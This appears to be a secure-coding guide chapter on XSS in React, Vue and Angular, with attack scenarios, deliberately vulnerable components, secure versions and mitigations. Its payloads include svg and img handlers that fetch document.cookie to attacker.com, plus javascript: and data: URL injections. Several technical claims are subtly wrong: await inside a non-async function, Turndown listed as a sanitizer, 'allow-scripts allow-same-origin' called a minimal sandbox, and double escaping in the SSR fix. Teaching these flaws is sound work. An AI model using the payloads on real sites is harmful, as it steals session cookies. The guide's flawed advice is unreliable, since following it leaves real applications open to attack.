# 48 · Security in Modern Frameworks (React, Vue, Angular)

## What It Is

React, Vue, and Angular each provide mechanisms to render dynamic HTML content: React's `dangerouslySetInnerHTML`, Vue's `v-html`, and Angular's `DomSanitizer.bypassSecurityTrustHtml`. These escape hatches exist for legitimate use cases (rich text editors, markdown renderers, HTML templates), but they bypass the framework's built-in XSS protections. Each framework also has framework-specific vulnerabilities: React JSX expression injection in templates, Vue template injection (especially in server-side rendering), Angular's `BypassSecurityTrustResourceUrl` misuse in iframe/object/embed tags, and hydration mismatches that allow injected content to become interactive JavaScript during SSR. Modern frameworks also introduce new CSRF attack surfaces when they manage tokens implicitly or fail to validate state changes.

Security in frameworks requires understanding where each framework sanitizes HTML (React does not), which APIs are "dangerous" and why, how server-side rendering introduces template injection risks, and how to correctly handle untrusted data in templates, event bindings, and dynamic attribute assignment.

## Why It Matters

Framework security is deceptive: the framework provides ergonomic APIs for safe HTML rendering (JSX, template interpolation), so developers assume all content is escaped by default. In React, it is—except when you use `dangerouslySetInnerHTML`. In Vue, it is—except when you use `v-html`. In Angular, it is—except when you call `DomSanitizer.bypassSecurityTrust*`. The escape hatches are sometimes necessary (e.g., rendering markdown), but they're also the #1 source of framework-based XSS vulnerabilities. Developers often justify them with "this is trusted input," but "trusted" is context-dependent: a markdown string from a user post is not trusted, even if you wrote the markdown parser yourself.

Server-side rendering introduces additional risks: if untrusted data is inserted into HTML templates before rendering (not via JSX interpolation but via string concatenation), template injection vulnerabilities arise. Hydration mismatches (where the server renders one thing and the client renders another) can be exploited to inject XSS payloads that survive the client-side re-render.

## Attack Scenarios

1. **React XSS via dangerouslySetInnerHTML with User Content**: A React comment component accepts user-submitted HTML from a WYSIWYG editor. The developer sanitizes HTML with a library (e.g., DOMPurify) and renders it with `dangerouslySetInnerHTML`: `<div dangerouslySetInnerHTML={{ __html: sanitize(userHtml) }} />`. A user submits `<svg onload="fetch('https://attacker.com?cookie='+document.cookie)">`. The sanitizer fails to remove the event handler (or the developer forgot to configure it), and the JavaScript executes in the user's browser, exfiltrating the session cookie. Later users who view the comment become victims.

2. **Vue v-html Template Injection in SSR**: A Next.js/Nuxt app renders a user profile page server-side. The template is `<div>{{ user.bio }}</div>`, but the API response includes injected template syntax: `{{ $fetch('/admin/promote', { user: 'attacker' }) }}`. During server-side rendering, the template is evaluated and the expression is executed, promoting the attacker to admin. Then the HTML is sent to the client where Vue safely re-renders the interpolated value (not as template syntax). The SSR step interpreted untrusted data as Liquid/Vue template code.

3. **Angular BypassSecurityTrustResourceUrl in Iframe Injection**: An Angular app has a user profile page with a `profileUrl` property. To allow users to embed external iframes, the component uses `DomSanitizer.bypassSecurityTrustResourceUrl(user.profileUrl)` and renders `<iframe [src]="profileUrl"></iframe>`. An attacker crafts a URL like `javascript:alert(document.cookie)` or `data:text/html,<script>alert('xss')</script>`. The sanitizer is bypassed, and the payload executes with the iframe's origin.

## Vulnerable Code

```typescript
// React: dangerouslySetInnerHTML without proper sanitization
import React, { useState } from 'react';

interface CommentProps {
  userContent: string;
}

// Vulnerable: No sanitization
function CommentComponent({ userContent }: CommentProps) {
  return (
    <div className="comment">
      <p dangerouslySetInnerHTML={{ __html: userContent }} />
    </div>
  );
}

// Usage: User submits `<img src=x onerror="fetch('https://attacker.com?c='+document.cookie)">`
export const VulnerableComment = () => {
  const [comments, setComments] = useState<string[]>([]);
  const [input, setInput] = useState('');

  const handleSubmit = () => {
    setComments([...comments, input]); // No validation
    setInput('');
  };

  return (
    <>
      <input
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="Add comment"
      />
      <button onClick={handleSubmit}>Post</button>
      {comments.map((comment, i) => (
        <CommentComponent key={i} userContent={comment} />
      ))}
    </>
  );
};

// Vue: v-html without sanitization
import { defineComponent } from 'vue';

export default defineComponent({
  data() {
    return {
      userBio: '', // From API or user input
    };
  },
  mounted() {
    // Fetch user bio from API
    fetch('/api/user/123')
      .then((res) => res.json())
      .then((data) => {
        // Dangerous: v-html renders unsanitized HTML
        this.userBio = data.bio;
      });
  },
  template: `
    <div class="profile">
      <!-- v-html bypasses Vue's built-in escaping -->
      <p v-html="userBio"></p>
    </div>
  `,
});

// Angular: bypassSecurityTrustResourceUrl without validation
import { Component, OnInit } from '@angular/core';
import { DomSanitizer, SafeResourceUrl } from '@angular/platform-browser';

interface UserProfile {
  name: string;
  profileEmbedUrl: string;
}

@Component({
  selector: 'app-profile',
  template: `
    <div class="profile">
      <h1>{{ user.name }}</h1>
      <!-- Dangerous: bypassSecurityTrustResourceUrl skips sanitization -->
      <iframe [src]="profileUrl" width="400" height="300"></iframe>
    </div>
  `,
})
export class ProfileComponent implements OnInit {
  user!: UserProfile;
  profileUrl!: SafeResourceUrl;

  constructor(private sanitizer: DomSanitizer) {}

  ngOnInit() {
    // Fetch user profile
    fetch('/api/user/123')
      .then((res) => res.json())
      .then((data: UserProfile) => {
        this.user = data;
        // Dangerous: trusts user input without validation
        this.profileUrl = this.sanitizer.bypassSecurityTrustResourceUrl(
          data.profileEmbedUrl
        );
      });
  }
}

// SSR Template Injection (Next.js/Nuxt)
// Vulnerable: User input inserted into template literal during SSR
export function UserProfilePageSSR({ userId }: { userId: string }) {
  const user = await fetch(`/api/users/${userId}`).then((r) => r.json());

  // If user.bio contains Vue/template syntax, it's evaluated during rendering
  const html = `
    <div class="profile">
      <h1>${user.name}</h1>
      <p>{{ user.bio }}</p>  <!-- Dangerous: Looks like template but it's in HTML -->
    </div>
  `;

  return html;
}
```

## Secure Code

```typescript
// React: Proper sanitization with DOMPurify
import React, { useState } from 'react';
import DOMPurify from 'dompurify';

interface CommentProps {
  userContent: string;
}

// Secure: Sanitize before passing to dangerouslySetInnerHTML
function SecureCommentComponent({ userContent }: CommentProps) {
  // DOMPurify removes event handlers, scripts, and unsafe attributes
  const cleanHtml = DOMPurify.sanitize(userContent, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br', 'code', 'pre'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
    // Prevent javascript: URLs
    ALLOW_DATA_ATTR: false,
  });

  return (
    <div className="comment">
      <p dangerouslySetInnerHTML={{ __html: cleanHtml }} />
    </div>
  );
}

export const SecureCommentSection = () => {
  const [comments, setComments] = useState<string[]>([]);
  const [input, setInput] = useState('');

  // Validate and sanitize on input
  const handleSubmit = () => {
    if (!input.trim()) return;

    // Sanitize before storing
    const sanitized = DOMPurify.sanitize(input);
    setComments([...comments, sanitized]);
    setInput('');
  };

  return (
    <>
      <input
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="Add comment (HTML support)"
        maxLength={500}
      />
      <button onClick={handleSubmit}>Post</button>
      {comments.map((comment, i) => (
        <SecureCommentComponent key={i} userContent={comment} />
      ))}
    </>
  );
};

// Vue: Safe rendering with text interpolation
import { defineComponent } from 'vue';
import DOMPurify from 'dompurify';

export default defineComponent({
  data() {
    return {
      user: { name: '', bio: '' },
    };
  },
  computed: {
    // Sanitize bio for safe rendering
    sanitizedBio(): string {
      return DOMPurify.sanitize(this.user.bio, {
        ALLOWED_TAGS: ['b', 'i', 'a'],
        ALLOWED_ATTR: ['href'],
      });
    },
  },
  mounted() {
    fetch('/api/user/123')
      .then((res) => res.json())
      .then((data) => {
        this.user = data;
      });
  },
  template: `
    <div class="profile">
      <h1>{{ user.name }}</h1>
      <!-- Safe: Vue interpolation escapes by default -->
      <!-- If you must render HTML, sanitize it in a computed property -->
      <p v-html="sanitizedBio"></p>
    </div>
  `,
});

// Angular: Validate and sanitize resource URLs
import { Component, OnInit } from '@angular/core';
import { DomSanitizer, SafeResourceUrl } from '@angular/platform-browser';

interface UserProfile {
  name: string;
  profileEmbedUrl: string;
}

@Component({
  selector: 'app-secure-profile',
  template: `
    <div class="profile">
      <h1>{{ user.name }}</h1>
      <!-- Safe: Use sanitized URL with validation -->
      <iframe
        *ngIf="profileUrl"
        [src]="profileUrl"
        width="400"
        height="300"
        sandbox="allow-scripts allow-same-origin"
      ></iframe>
      <p *ngIf="!profileUrl">No embedded profile available</p>
    </div>
  `,
})
export class SecureProfileComponent implements OnInit {
  user!: UserProfile;
  profileUrl: SafeResourceUrl | null = null;

  constructor(private sanitizer: DomSanitizer) {}

  ngOnInit() {
    fetch('/api/user/123')
      .then((res) => res.json())
      .then((data: UserProfile) => {
        this.user = data;
        // Validate URL before trusting
        if (this.isValidEmbedUrl(data.profileEmbedUrl)) {
          this.profileUrl = this.sanitizer.bypassSecurityTrustResourceUrl(
            data.profileEmbedUrl
          );
        }
      });
  }

  // Strict validation: only allow https:// URLs
  private isValidEmbedUrl(url: string): boolean {
    try {
      const parsed = new URL(url);
      // Only allow https and same-origin
      return (
        parsed.protocol === 'https:' &&
        (parsed.origin === window.location.origin ||
          this.isAllowedDomain(parsed.hostname))
      );
    } catch {
      return false;
    }
  }

  private isAllowedDomain(hostname: string): boolean {
    const allowedDomains = ['trusted-embed-provider.com', 'videos.example.com'];
    return allowedDomains.includes(hostname);
  }
}

// SSR: Template Escaping (Next.js example with proper escaping)
import { escapeHtml } from 'some-html-escaping-lib';

export async function getServerSideProps({ params }: any) {
  const user = await fetch(`/api/users/${params.userId}`).then((r) =>
    r.json()
  );

  // Properly escape all user-provided strings in HTML
  const escapedName = escapeHtml(user.name);
  const escapedBio = escapeHtml(user.bio);

  // Return as component (React/Next.js will handle escaping)
  return {
    props: { user: { name: escapedName, bio: escapedBio } },
  };
}

export default function UserProfilePage({ user }: any) {
  // React/JSX automatically escapes interpolated values
  return (
    <div className="profile">
      <h1>{user.name}</h1>
      <p>{user.bio}</p>
    </div>
  );
}
```

## Mitigations

- **Use framework escaping by default; sanitize only when HTML must be rendered**: React JSX escapes by default, Vue interpolation `{{ }}` escapes by default, Angular `{{ }}` escapes. Never use `dangerouslySetInnerHTML`, `v-html`, or `bypassSecurityTrust*` unless HTML rendering is explicitly required. When required, sanitize with DOMPurify, bleach, or equivalent and maintain an allowlist of safe tags and attributes.

- **For `dangerouslySetInnerHTML` / `v-html`, always use a sanitization library with allowlist-based filtering**: Use DOMPurify, bleach (server-side), or Turndown for sanitization. Configure with `ALLOWED_TAGS` and `ALLOWED_ATTR` whitelists, not blacklists. Reject `javascript:` URLs, event handlers (`on*` attributes), and unsafe elements (`<script>`, `<iframe>`, `<object>`). Re-sanitize on every render to catch upstream changes.

- **Validate and allowlist URLs before using `bypassSecurityTrustResourceUrl` or similar**: Check that URLs match an allowed protocol (`https://` only) and origin (same-origin or allowlisted domains). Use `new URL()` to parse and validate. Reject `javascript:`, `data:`, and `vbscript:` schemes. For iframes, add `sandbox` attribute with minimal permissions (`sandbox="allow-scripts allow-same-origin"`).

- **In SSR (Next.js, Nuxt, Remix), never concatenate untrusted data into HTML templates**: Use framework-provided rendering functions (e.g., React `renderToString()`, Vue `renderToString()`) that escape by default. Never use template literal HTML with user data. Validate and sanitize data before rendering, not during template generation.

- **Prevent hydration mismatches by ensuring server and client render identically**: If using conditional rendering based on `typeof window`, ensure the condition is the same on server and client. Mismatches allow injected content to survive the client-side re-render. Use tools like `suppressHydrationWarning` cautiously; prefer eliminating the mismatch.

- **For CSRF protection, validate state-changing operations with tokens**: Modern frameworks often manage CSRF tokens implicitly (e.g., `next-csrf`, Angular HTTP interceptors), but verify they are being validated server-side. Include a CSRF token in POST/PUT/DELETE requests and validate it before processing state changes. Use SameSite cookies (`SameSite=Strict` or `SameSite=Lax`) as defense-in-depth.

- **Audit third-party components and dependencies for dangerous patterns**: Review npm package code for `dangerouslySetInnerHTML`, `v-html`, `innerHTML` assignments. Use `npm audit`, `snyk`, or similar to flag vulnerable dependency versions. Pin dependency versions and conduct supply-chain security reviews before updating major versions.

## References

- [React: dangerouslySetInnerHTML - React Docs](https://react.dev/reference/react-dom/components/common#dangerouslysetinnerhtml)
- [DOMPurify: XSS Sanitizer for HTML, MathML and SVG](https://github.com/cure53/DOMPurify)
- [OWASP: Template Injection](https://owasp.org/www-community/Server-Side_Template_Injection)
- [Angular Security: Sanitization and XSS Prevention](https://angular.io/guide/security)
- [Vue Security: Server-Side Rendering (SSR) Caveats](https://vuejs.org/guide/scaling-up/ssr.html#security-considerations)
